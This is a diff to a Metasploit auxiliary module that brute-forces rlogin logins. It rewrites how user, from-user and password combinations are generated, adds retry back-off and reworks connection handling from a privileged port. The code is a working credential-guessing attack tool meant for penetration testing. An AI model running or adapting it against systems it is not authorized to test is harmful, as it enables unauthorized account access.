@@ -50,12 +50,15 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		print_status("#{ip}:#{rport} - Starting rlogin sweep")
 
-		luser = datastore['LOCALUSER']
-		luser ||= 'root'
+		# We make a first connection to assess initial state of the service. If the
+		# service isn't available, we don't even bother to try further attempts against
+		# this host. Also, bind errors shouldn't happen and are treated as fatal here.
+		status = connect_from_privileged_port
+		return :abort if [ :refused, :bind_error ].include? status
 
 		begin
 			each_user_fromuser_pass { |user, fromuser, pass|
-				try_user_pass(user, fromuser, pass)
+				try_user_pass(user, fromuser, pass, status)
 			}
 		rescue ::Rex::ConnectionError
 			nil
@@ -81,27 +84,39 @@ class Metasploit3 < Msf::Auxiliary
 			credentials = gen_blank_passwords(users, credentials)
 		end
 
-		# user+pass pairs, don't set the fromuser
-		credentials.map! { |c|
-			u,p = c
-			[ u, [ nil, p ] ]
+		credentials.concat(combine_users_and_passwords(users, passwords))
+		credentials.uniq!
+
+		# Okay, now we have a list of credentials to try. We want to merge in
+		# our list of from users for each user.
+		indexes = {}
+		credentials.map! { |u,p|
+			idx = indexes[u]
+			idx ||= 0
+
+			pa = nil
+			if idx >= fromusers.length
+				pa = [ nil, p ]
+			else
+				pa = [ fromusers[idx], p ]
+				indexes[u] = idx + 1
+			end
+			[ u, pa ]
 		}
 
-		if passwords.length > 0
-			# pair up fromusers 1:1 with passwords, turning each password into an array
-			passwords.map! { |p|
-				fu = fromusers.shift
-				p = [ fu, p ]
-			}
-			# more fromusers than passwords? append nil passwords, which will be handled specially
-			# by the login processing.
-			fromusers.each { |fu|
-				passwords << [ fu, nil ]
-			}
-		end
+		# If there are more fromusers than passwords, append nil passwords, which will be handled
+		# specially by the login processing.
+		indexes.each_key { |u|
+			idx = indexes[u]
+			while idx < fromusers.length
+				credentials << [ u, [ fromusers[idx], nil ] ]
+				idx += 1
+			end
+		}
+		indexes = {}
 
-		credentials.concat(combine_users_and_passwords(users, passwords))
-		#credentials = just_uniq_passwords(credentials) if @strip_usernames
+		# We do a second uniq! pass in case we added some dupes somehow
+		credentials.uniq!
 
 		fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
 
@@ -140,39 +155,33 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	def try_user_pass(user, luser, pass)
+	def try_user_pass(user, luser, pass, status = nil)
 		luser ||= 'root'
 
-		vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':'#{pass}' from '#{luser}'"
-		#vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':'#{pass.inspect}' from '#{luser.inspect}'"
+		vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':#{pass.inspect} from '#{luser}'"
+
 		this_attempt ||= 0
 		ret = nil
 		while this_attempt <= 3 and (ret.nil? or ret == :refused)
 			if this_attempt > 0
-				select(nil,nil,nil, 2**this_attempt)
-				vprint_error "#{rhost}:#{rport} rlogin - Retrying '#{user}':'#{pass}' from '#{luser}' due to reset"
+				# power of 2 back-off
+				select(nil, nil, nil, 2**this_attempt)
+				vprint_error "#{rhost}:#{rport} rlogin - Retrying '#{user}':#{pass.inspect} from '#{luser}' due to reset"
 			end
-			ret = do_login(user, pass, luser)
+			ret = do_login(user, pass, luser, status)
 			this_attempt += 1
 		end
 
 		case ret
-		when :no_auth_required
-			print_good "#{rhost}:#{rport} rlogin - No authentication required!"
-			return :abort
-
 		when :no_pass_prompt
 			vprint_status "#{rhost}:#{rport} rlogin - Skipping '#{user}' due to missing password prompt"
 			return :skip_user
 
-		when :timeout
-			vprint_status "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to timeout"
-
 		when :busy
-			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to busy state"
+			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':#{pass.inspect} from '#{luser}' due to busy state"
 
 		when :refused
-			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':'#{pass}' from '#{luser}' due to connection refused."
+			vprint_error "#{rhost}:#{rport} rlogin - Skipping '#{user}':#{pass.inspect} from '#{luser}' due to connection refused."
 
 		when :skip_user
 			vprint_status "#{rhost}:#{rport} rlogin - Skipping disallowed user '#{user}' for subsequent requests"
@@ -188,31 +197,28 @@ class Metasploit3 < Msf::Auxiliary
 				return :next_user
 			end
 		end
+
+		# Default to returning whatever we got last..
+		ret
 	end
 
 
-	# Sometimes telnet servers start RSTing if you get them angry.
-	# This is a short term fix; the problem is that we don't know
-	# if it's going to reset forever, or just this time, or randomly.
-	# A better solution is to get the socket connect to try again
-	# with a little backoff.
-	def connect_reset_safe
-		begin
-			# Reset our accumulators for interacting with /bin/login
-			@recvd = ''
-			@trace = ''
-			# We must connect from a privileged port.
-			connect_from_privileged_port
-		rescue Rex::ConnectionRefused
-			return :refused
+	def do_login(user, pass, luser, status = nil)
+		# Reset our accumulators for interacting with /bin/login
+		@recvd = ''
+		@trace = ''
+
+		# We must connect from a privileged port. This only occurs when status
+		# is nil. That is, it only occurs when a connection doesn't already exist.
+		if not status
+			status = connect_from_privileged_port
+			return :refused if status == :refused
 		end
-		return :connected
-	end
 
+		# Abort if we didn't get successfully connected.
+		return :abort if status != :connected
 
-	def do_login(user, pass, luser)
-		return :refused if connect_reset_safe == :refused
-
+		# Send the local/remote usernames and the desired terminal type/speed
 		sock.put("\x00#{luser}\x00#{user}\x00#{datastore['TERM']}/#{datastore['SPEED']}\x00")
 
 		# Read the expected nul byte response.
@@ -272,15 +278,15 @@ class Metasploit3 < Msf::Auxiliary
 			vprint_status("#{rhost}:#{rport} Result: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")
 
 			if login_succeeded?
-				print_good("#{target_host}:#{rport}, rlogin '#{user}' : '#{pass}' from '#{luser}'")
-				start_rlogin_session(rhost, rport, user, luser, pass, @trace)
+				print_good("#{target_host}:#{rport}, rlogin '#{user}' : #{pass.inspect}")
+				start_rlogin_session(rhost, rport, user, nil, pass, @trace)
 				return :success
 			else
 				return :fail
 			end
 		else
 			if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
-				return :success
+				return :succeeded # intentionally not :success
 			else
 				self.sock.close unless self.sock.closed?
 				return :no_pass_prompt
